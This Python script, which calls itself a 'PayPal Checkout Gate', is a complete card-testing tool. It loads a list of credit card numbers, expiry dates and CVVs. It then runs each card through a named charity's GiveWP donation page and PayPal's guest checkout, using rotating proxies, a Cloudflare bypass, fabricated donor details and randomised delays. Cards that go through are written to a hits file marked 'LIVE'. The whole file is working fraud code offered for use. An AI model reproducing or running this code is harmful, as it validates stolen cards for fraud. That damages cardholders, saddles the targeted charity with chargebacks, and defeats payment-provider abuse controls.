#!/usr/bin/env python3
"""
Standalone PayPal Checkout Gate (GiveWP Donate → PayPal Guest).
Not linked to the bot. Run from terminal; reads cc.txt, proxy.txt; writes hits to results.txt.

Usage:
  python paypal_checkout.py
  python paypal_checkout.py --cc path/to/cc.txt --proxy path/to/proxy.txt --results path/to/results.txt
  python paypal_checkout.py --site https://elemotion.org/donate/ --amount 5.00

CC format in cc.txt: number|month|year|cvv  or  number|month|year|cvv|first|last|email
Proxy format in proxy.txt: http://user:pass@host:port  or  host:port  (one per line)
"""

import re
import sys
import json
import time
import random
import argparse
from pathlib import Path
from urllib.parse import urlparse, urljoin, parse_qs

try:
    import requests
except ImportError:
    print("Install: pip install requests")
    sys.exit(1)

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

# -----------------------------------------------------------------------------
# Config & paths
# -----------------------------------------------------------------------------
SCRIPT_DIR = Path(__file__).resolve().parent
DEFAULT_CC_FILE = SCRIPT_DIR / "cc.txt"
DEFAULT_PROXY_FILE = SCRIPT_DIR / "proxy.txt"
DEFAULT_RESULTS_FILE = SCRIPT_DIR / "results.txt"
DEFAULT_SITE_URL = "https://elemotion.org/donate/"
DEFAULT_AMOUNT = "5.00"
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"


def load_lines(path: Path, strip_empty: bool = True):
    if not path.exists():
        return []
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        lines = [ln.strip() for ln in f if ln.strip() or not strip_empty]
    return lines


def get_proxy_list(proxy_path: Path) -> list:
    lines = load_lines(proxy_path)
    out = []
    for ln in lines:
        ln = ln.strip()
        if not ln or ln.startswith("#"):
            continue
        if not ln.startswith("http"):
            ln = "http://" + ln
        out.append(ln)
    return out


def parse_cc(line: str) -> dict:
    """Parse CC line: number|month|year|cvv  or  number|month|year|cvv|first|last|email"""
    parts = [p.strip() for p in line.split("|")]
    if len(parts) < 4:
        return {}
    return {
        "number": parts[0].replace(" ", ""),
        "month": parts[1].zfill(2),
        "year": parts[2][-2:] if len(parts[2]) > 2 else parts[2],
        "cvv": parts[3],
        "first": parts[4] if len(parts) > 4 else "John",
        "last": parts[5] if len(parts) > 5 else "Doe",
        "email": parts[6] if len(parts) > 6 else f"donor{random.randint(10000,99999)}@mail.com",
    }


# -----------------------------------------------------------------------------
# GiveWP: donate page, nonce, load gateway, process donation
# -----------------------------------------------------------------------------
def givewp_get_donate_page(session, base_url: str, proxy: str = None) -> tuple:
    """GET donate page. Returns (ok, html, parsed_data)."""
    url = base_url.rstrip("/")
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "user-agent": USER_AGENT,
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = session.get(url, headers=headers, timeout=25, proxies=proxies)
        if r.status_code != 200:
            return False, r.text or "", {}
        html = r.text
        # Parse give_form_id, give-form-hash (nonce), give_form_id_prefix
        give_form_id = None
        give_form_hash = None
        give_form_id_prefix = None
        m = re.search(r'name="give-form-id"[^>]*value="(\d+)"', html, re.I)
        if m:
            give_form_id = m.group(1)
        m = re.search(r'name="give-form-hash"[^>]*value="([^"]+)"', html, re.I)
        if m:
            give_form_hash = m.group(1)
        m = re.search(r'give-form-id-prefix"[^>]*value="([^"]+)"', html, re.I)
        if m:
            give_form_id_prefix = m.group(1)
        if not give_form_id:
            m = re.search(r'id="give-form-id-(\d+)"', html, re.I)
            if m:
                give_form_id = m.group(1)
        if not give_form_id_prefix and give_form_id:
            give_form_id_prefix = f"{give_form_id}-1"
        return True, html, {
            "give_form_id": give_form_id,
            "give_form_hash": give_form_hash,
            "give_form_id_prefix": give_form_id_prefix or f"{give_form_id}-1",
        }
    except Exception as e:
        return False, str(e), {}


def givewp_reset_nonce(session, base_url: str, form_id: str, proxy: str = None) -> bool:
    origin = base_url.rstrip("/").rstrip("/donate").rstrip("/donate/")
    if "/donate" in base_url:
        origin = base_url.split("/donate")[0]
    ajax_url = urljoin(origin + "/", "/wp-admin/admin-ajax.php")
    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": origin,
        "referer": base_url.rstrip("/") + "/",
        "user-agent": USER_AGENT,
        "x-requested-with": "XMLHttpRequest",
    }
    data = {"action": "give_donation_form_reset_all_nonce", "give_form_id": form_id}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = session.post(ajax_url, headers=headers, data=data, timeout=20, proxies=proxies)
        return r.status_code == 200
    except Exception:
        return False


def givewp_load_gateway(session, base_url: str, form_id: str, form_id_prefix: str, proxy: str = None) -> tuple:
    """POST give_load_gateway (paypal). Returns (ok, nonce)."""
    origin = base_url.rstrip("/").split("/donate")[0] if "/donate" in base_url else base_url.rstrip("/")
    ajax_url = urljoin(origin + "/", "/wp-admin/admin-ajax.php")
    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": origin,
        "referer": base_url.rstrip("/") + "/",
        "user-agent": USER_AGENT,
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "action": "give_load_gateway",
        "give_total": "5.00",
        "give_form_id": form_id,
        "give_form_id_prefix": form_id_prefix,
        "give_payment_mode": "paypal",
        "nonce": "",  # will be in response or use form hash
    }
    params = {"payment-mode": "paypal"}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = session.post(ajax_url, headers=headers, data=data, params=params, timeout=20, proxies=proxies)
        if r.status_code != 200:
            return False, None
        text = r.text
        # Response may be HTML with form containing nonce, or JSON
        if "nonce" in text.lower():
            m = re.search(r'"nonce"\s*:\s*"([^"]+)"', text, re.I)
            if m:
                return True, m.group(1)
            m = re.search(r'name="give-form-hash"[^>]*value="([^"]+)"', text, re.I)
            if m:
                return True, m.group(1)
        return True, None
    except Exception:
        return False, None


def givewp_process_donation(
    session,
    base_url: str,
    form_id: str,
    form_id_prefix: str,
    form_hash: str,
    cc: dict,
    amount: str,
    proxy: str = None,
) -> tuple:
    """POST give_process_donation. Returns (ok, redirect_url_or_error)."""
    origin = base_url.rstrip("/").split("/donate")[0] if "/donate" in base_url else base_url.rstrip("/")
    ajax_url = urljoin(origin + "/", "/wp-admin/admin-ajax.php")
    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": origin,
        "referer": base_url.rstrip("/") + "/",
        "user-agent": USER_AGENT,
        "x-requested-with": "XMLHttpRequest",
    }
    data = {
        "give-honeypot": "",
        "give-form-id-prefix": form_id_prefix,
        "give-form-id": form_id,
        "give-form-title": "Donate",
        "give-current-url": base_url.rstrip("/") + "/",
        "give-form-url": base_url.rstrip("/") + "/",
        "give-form-minimum": amount,
        "give-form-maximum": "999999.99",
        "give-form-hash": form_hash,
        "give-price-id": "custom",
        "give-recurring-logged-in-only": "",
        "give-logged-in-only": "1",
        "_give_is_donation_recurring": "0",
        "give_recurring_donation_details": '{"give_recurring_option":"yes_donor"}',
        "give-amount": amount,
        "give-recurring-period-donors-choice": "month",
        "support_a_program[]": "Ranger Support",
        "payment-mode": "paypal",
        "give_first": cc.get("first", "John"),
        "give_last": cc.get("last", "Doe"),
        "give_company_option": "no",
        "give_company_name": "",
        "give_email": cc.get("email", "donor@mail.com"),
        "give_anonymous_donation": "1",
        "give_action": "purchase",
        "give-gateway": "paypal",
        "action": "give_process_donation",
        "give_ajax": "true",
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = session.post(ajax_url, headers=headers, data=data, timeout=30, proxies=proxies, allow_redirects=False)
        text = (r.text or "").strip()
        # JSON response with redirect URL
        if text.startswith("{"):
            try:
                j = json.loads(text)
                red = j.get("redirect") or j.get("data", {}).get("redirect") if isinstance(j.get("data"), dict) else None
                if red:
                    return True, red
                msg = j.get("data", {}).get("error_message") or j.get("message", "") if isinstance(j.get("data"), dict) else j.get("message", "")
                return False, msg or "No redirect in response"
            except json.JSONDecodeError:
                pass
        # HTML or redirect
        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("location") or r.headers.get("Location")
            if loc:
                return True, urljoin(base_url, loc)
        # Look for redirect URL in body (script, meta, link)
        m = re.search(r'https://www\.paypal\.com/donate[^\s"\'<>)]+', text)
        if m:
            return True, m.group(0).split('"')[0].split("'")[0].split(")")[0]
        m = re.search(r'window\.location\s*=\s*["\']([^"\']+)["\']', text, re.I)
        if m:
            return True, m.group(1)
        m = re.search(r'content="\d+;\s*url=([^"]+)"', text, re.I)
        if m:
            return True, m.group(1).strip()
        return False, "No PayPal redirect in response"
    except Exception as e:
        return False, str(e)


# -----------------------------------------------------------------------------
# PayPal: get token from redirect, guest flow, onboarding, result
# -----------------------------------------------------------------------------
def paypal_get_token_from_url(redirect_url: str) -> str:
    parsed = urlparse(redirect_url)
    qs = parse_qs(parsed.query)
    return (qs.get("token") or [None])[0] or ""


def paypal_get_donate_page(session, token: str, proxy: str = None) -> tuple:
    """GET paypal.com/donate/ with token. Returns (ok, html, csrf_token)."""
    url = "https://www.paypal.com/donate/"
    params = {"token": token}
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "user-agent": USER_AGENT,
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = session.get(url, params=params, headers=headers, timeout=25, proxies=proxies)
        if r.status_code != 200:
            return False, r.text or "", None
        html = r.text
        csrf = None
        m = re.search(r'"csrfToken"\s*:\s*"([^"]+)"', html, re.I)
        if m:
            csrf = m.group(1)
        if not csrf:
            m = re.search(r'x-csrf-token["\']?\s*[:=]\s*["\']([^"\']+)', html, re.I)
            if m:
                csrf = m.group(1)
        return True, html, csrf
    except Exception as e:
        return False, str(e), None


def paypal_welcome_donate(
    session,
    token: str,
    cc: dict,
    proxy: str = None,
    csrf_token: str = None,
) -> tuple:
    """POST /US/welcome/donate (guest account create with card). Returns (ok, encrypted_account_number or None, shipping_address_id or None)."""
    url = "https://www.paypal.com/US/welcome/donate"
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://www.paypal.com",
        "referer": f"https://www.paypal.com/donate/guest?token={token}",
        "user-agent": USER_AGENT,
        "x-requested-with": "XMLHttpRequest",
        "x-onboarding-shared-key": token,
    }
    if csrf_token:
        headers["x-csrf-token"] = csrf_token
    expiry = f"{cc['month']}/{cc['year']}"
    json_data = {
        "/paypalAccountData/address/0/normalizationStatus": "NON_NORMALIZED",
        "/paypalAccountData/phoneCountry": "US",
        "/initiatePhoneConfirmData/phoneCountry": "US",
        "/paypalAccountData/countryselector": "US",
        "/cardData/cardNumber": cc["number"],
        "/cardData/expiryDate": expiry,
        "/cardData/csc": cc["cvv"],
        "/paypalAccountData/firstName": cc.get("first", "John"),
        "/paypalAccountData/lastName": cc.get("last", "Doe"),
        "/paypalAccountData/address/0/address1": "123 Main St",
        "/paypalAccountData/address/0/address2": "",
        "/paypalAccountData/address/0/city": "Los Angeles",
        "/paypalAccountData/address/0/state": "CA",
        "/paypalAccountData/address/0/zip": "90008",
        "/paypalAccountData/address/0/label": "home",
        "/paypalAccountData/phoneOption": "Mobile",
        "/paypalAccountData/phoneNumber": "7472920712",
        "/paypalAccountData/phoneCountryCode": "1",
        "/paypalAccountData/email": cc.get("email", "donor@mail.com"),
        "/paypalAccountData/memberMandatory": False,
        "/cardData/skipAuth": True,
        "/cardData/address/address1": "123 Main St",
        "/cardData/address/address2": "",
        "/cardData/address/city": "Los Angeles",
        "/cardData/address/state": "CA",
        "/cardData/address/zip": "90008",
        "/cardData/firstName": cc.get("first", "John"),
        "/cardData/lastName": cc.get("last", "Doe"),
        "/paypalAccountData/createUpdateReady": True,
        "/cardData/createUpdateReady": True,
        "/appData/action": "submit_account_create",
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = session.post(url, headers=headers, json=json_data, timeout=30, proxies=proxies)
        enc = None
        shipping_id = None
        if r.status_code == 200 and r.text:
            try:
                j = r.json()
                enc = j.get("encryptedAccountNumber") or (j.get("data") or {}).get("encryptedAccountNumber")
                shipping_id = j.get("shippingAddressId") or (j.get("data") or {}).get("shippingAddressId")
            except Exception:
                pass
        return r.status_code == 200, enc, shipping_id
    except Exception:
        return False, None, None


def paypal_get_card_data(session, token: str, card_number: str, proxy: str = None, csrf_token: str = None) -> tuple:
    """POST getCardData. Returns (ok, encrypted_account_number, shipping_address_id or None)."""
    url = "https://www.paypal.com/welcome/rest/v1/getCardData"
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://www.paypal.com",
        "referer": f"https://www.paypal.com/donate/guest?token={token}",
        "user-agent": USER_AGENT,
        "x-requested-with": "XMLHttpRequest",
        "x-onboarding-shared-key": token,
    }
    if csrf_token:
        headers["x-csrf-token"] = csrf_token
    json_data = {"cardNumber": card_number}
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = session.post(url, headers=headers, json=json_data, timeout=20, proxies=proxies)
        enc = None
        shipping_id = None
        if r.status_code == 200 and r.text:
            try:
                j = r.json()
                enc = j.get("encryptedAccountNumber") or (j.get("data") or {}).get("encryptedAccountNumber")
                shipping_id = j.get("shippingAddressId") or (j.get("data") or {}).get("shippingAddressId")
            except Exception:
                pass
        return r.status_code == 200, enc, shipping_id
    except Exception:
        return False, None, None


def paypal_guest_onboarding(
    session,
    token: str,
    encrypted_account: str,
    cc: dict,
    amount: str = "5.00",
    shipping_address_id: str = None,
    proxy: str = None,
) -> tuple:
    """POST donate/guest/onboarding. Returns (ok, response_text)."""
    url = "https://www.paypal.com/donate/guest/onboarding"
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://www.paypal.com",
        "referer": f"https://www.paypal.com/donate/guest?token={token}",
        "user-agent": USER_AGENT,
        "x-requested-with": "XMLHttpRequest",
        "x-onboarding-shared-key": token,
    }
    json_data = {
        "encryptedAccountNumber": encrypted_account,
        "card": {"securityCode": cc["cvv"]},
        "formData": {
            "billingAddress": {"country": "US"},
            "user": {"email": cc.get("email", "donor@mail.com")},
            "phone": {},
        },
        "donationAmount": amount,
        "currencyCode": "USD",
        "currencySymbol": "$",
        "addressSharingConsent": False,
        "note": "",
        "recurring": "unchecked",
        "giftAidItFlag": False,
        "isPartnerFlow": False,
        "offerProgram": {"businessName": "Elemotion Foundation"},
        "token": token,
    }
    if shipping_address_id:
        json_data["shippingAddressId"] = shipping_address_id
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = session.post(url, headers=headers, json=json_data, timeout=30, proxies=proxies)
        return r.status_code == 200, r.text or ""
    except Exception as e:
        return False, str(e)


def paypal_final_result(session, token: str, proxy: str = None) -> tuple:
    """GET final donate/?token=...&country.x=US&locale.x=US. Returns (success, message)."""
    url = "https://www.paypal.com/donate/"
    params = {"token": token, "country.x": "US", "locale.x": "US"}
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "referer": f"https://www.paypal.com/donate/guest?token={token}",
        "user-agent": USER_AGENT,
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        r = session.get(url, params=params, headers=headers, timeout=25, proxies=proxies)
        if r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("location") or r.headers.get("Location") or ""
            if "donation-confirmation" in loc or "success" in loc.lower() or "return" in loc:
                return True, "Redirect to success"
        text = (r.text or "").lower()
        if "thank you" in text or "donation complete" in text or "success" in text or "confirmed" in text:
            return True, "Success (parsed from page)"
        if "declined" in text or "invalid" in text or "error" in text or "failed" in text:
            return False, "Declined/error (parsed from page)"
        # Check JSON if any
        try:
            j = r.json()
            if j.get("status") == "success" or j.get("success"):
                return True, "Success (JSON)"
            return False, j.get("message") or j.get("error") or "Unknown"
        except Exception:
            pass
        return False, "Unknown result"
    except Exception as e:
        return False, str(e)


# -----------------------------------------------------------------------------
# Single check: full flow
# -----------------------------------------------------------------------------
def check_one(cc_line: str, site_url: str, amount: str, proxy: str, results_path: Path) -> dict:
    """Run full flow for one CC. Returns result dict with status, message, cc_display."""
    cc = parse_cc(cc_line)
    if not cc or not cc.get("number"):
        return {"status": False, "message": "Invalid CC line", "cc_display": cc_line[:30]}

    session = requests.Session()
    session.headers.update({"User-Agent": USER_AGENT})
    if proxy:
        session.proxies = {"http": proxy, "https": proxy}

    # Use cloudscraper for GiveWP if available (CF bypass)
    if HAS_CLOUDSCRAPER and proxy:
        try:
            scraper = cloudscraper.create_scraper(browser={"browser": "chrome", "platform": "windows", "mobile": False})
            scraper.proxies = {"http": proxy, "https": proxy}
            session = scraper
        except Exception:
            pass

    # --- GiveWP ---
    ok, html, parsed = givewp_get_donate_page(session, site_url, proxy)
    if not ok or not parsed.get("give_form_id"):
        return {"status": False, "message": "GiveWP: failed to load donate page or form id", "cc_display": cc_line[:40]}

    form_id = parsed["give_form_id"]
    form_id_prefix = parsed.get("give_form_id_prefix") or f"{form_id}-1"
    form_hash = parsed.get("give_form_hash") or ""

    givewp_reset_nonce(session, site_url, form_id, proxy)
    time.sleep(0.5)

    ok, nonce = givewp_load_gateway(session, site_url, form_id, form_id_prefix, proxy)
    if nonce:
        form_hash = nonce
    time.sleep(0.4)

    ok, redirect_url = givewp_process_donation(
        session, site_url, form_id, form_id_prefix, form_hash, cc, amount, proxy
    )
    if not ok or not redirect_url or "paypal.com" not in redirect_url:
        return {"status": False, "message": f"GiveWP process: {redirect_url or 'no redirect'}", "cc_display": cc_line[:40]}

    token = paypal_get_token_from_url(redirect_url)
    if not token:
        return {"status": False, "message": "PayPal: no token in redirect URL", "cc_display": cc_line[:40]}

    # --- PayPal ---
    ok, html, csrf = paypal_get_donate_page(session, token, proxy)
    if not ok:
        return {"status": False, "message": "PayPal: failed to load donate page", "cc_display": cc_line[:40]}

    time.sleep(0.6)

    # Try welcome/donate first (guest create with card)
    ok, enc, shipping_id = paypal_welcome_donate(session, token, cc, proxy)
    if not enc:
        ok, enc, sid2 = paypal_get_card_data(session, token, cc["number"], proxy)
        if sid2:
            shipping_id = sid2
    if not enc:
        return {"status": False, "message": "PayPal: no encryptedAccountNumber (CF/bot block?)", "cc_display": cc_line[:40]}

    time.sleep(0.5)

    ok, onboarding_text = paypal_guest_onboarding(session, token, enc, cc, amount, shipping_id, proxy)
    if not ok:
        try:
            j = json.loads(onboarding_text)
            msg = j.get("message") or j.get("error") or onboarding_text[:200]
        except Exception:
            msg = onboarding_text[:200] if onboarding_text else "Onboarding failed"
        return {"status": False, "message": f"PayPal onboarding: {msg}", "cc_display": cc_line[:40]}

    time.sleep(0.8)

    success, result_msg = paypal_final_result(session, token, proxy)

    cc_display = f"{cc['number']}|{cc['month']}|{cc['year']}|{cc['cvv']}"
    if success:
        return {"status": True, "message": result_msg, "cc_display": cc_display}
    return {"status": False, "message": result_msg, "cc_display": cc_display}


# -----------------------------------------------------------------------------
# Main: load cc.txt, proxy.txt, run checks, write results.txt
# -----------------------------------------------------------------------------
def main():
    ap = argparse.ArgumentParser(description="PayPal Checkout Gate (GiveWP → PayPal Guest)")
    ap.add_argument("--cc", default=str(DEFAULT_CC_FILE), help="Path to cc.txt")
    ap.add_argument("--proxy", default=str(DEFAULT_PROXY_FILE), help="Path to proxy.txt")
    ap.add_argument("--results", default=str(DEFAULT_RESULTS_FILE), help="Path to results.txt")
    ap.add_argument("--site", default=DEFAULT_SITE_URL, help="Donate page URL")
    ap.add_argument("--amount", default=DEFAULT_AMOUNT, help="Donation amount")
    args = ap.parse_args()

    cc_path = Path(args.cc)
    proxy_path = Path(args.proxy)
    results_path = Path(args.results)

    if not cc_path.exists():
        print(f"CC file not found: {cc_path}")
        print("Create cc.txt with one CC per line: number|month|year|cvv  or  number|month|year|cvv|first|last|email")
        sys.exit(1)

    cc_lines = load_lines(cc_path)
    if not cc_lines:
        print("No CC lines in", cc_path)
        sys.exit(1)

    proxies = get_proxy_list(proxy_path)
    if not proxies:
        print("No proxies in", proxy_path, "- running without proxy (may get blocked)")

    print("=" * 60)
    print("PayPal Checkout Gate (standalone)")
    print("=" * 60)
    print(f"CC file: {cc_path} ({len(cc_lines)} lines)")
    print(f"Proxy file: {proxy_path} ({len(proxies)} proxies)")
    print(f"Results: {results_path}")
    print(f"Site: {args.site}  Amount: {args.amount}")
    print("=" * 60)

    results_path.parent.mkdir(parents=True, exist_ok=True)

    for i, line in enumerate(cc_lines, 1):
        proxy = proxies[(i - 1) % len(proxies)] if proxies else None
        print(f"[{i}/{len(cc_lines)}] Checking... ", end="", flush=True)
        result = check_one(line, args.site, args.amount, proxy, results_path)
        if result["status"]:
            print("LIVE")
            with open(results_path, "a", encoding="utf-8") as f:
                f.write(result["cc_display"] + "\n")
        else:
            print("DEAD -", result["message"][:60])
        time.sleep(1.0 + random.uniform(0, 1))

    print("=" * 60)
    print("Done. Hits appended to", results_path)


if __name__ == "__main__":
    main()
